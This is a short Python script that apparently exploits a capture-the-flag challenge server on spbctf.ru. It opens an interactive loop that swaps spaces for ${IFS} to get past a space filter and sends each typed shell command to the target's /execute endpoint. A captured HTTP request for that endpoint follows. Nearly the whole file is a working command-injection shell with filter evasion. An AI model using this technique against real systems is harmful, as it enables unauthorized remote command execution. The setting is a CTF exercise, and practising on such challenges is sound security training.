
from requests import get,post

a=0
while a!='exit!':
	a=input('>>> ')
	b = ''
	for c in a:
		if c == ' ':
			b += "${IFS}"
		else:
			b += c
	print(f'~~> {b}')
	resp = get('https://its-broken-b2ibel8m.spbctf.ru/execute', params={'cmd':b})
	print(resp.text)

"""
GET /execute?cmd=dir HTTP/2
Host: its-broken-b2ibel8m.spbctf.ru
Cookie: __cfduid=dab8ac9b30b9fad714453bb32c7848ae
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Sec-Ch-Ua-Platform-Version: ""
Sec-Ch-Ua-Full-Version-List: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7


"""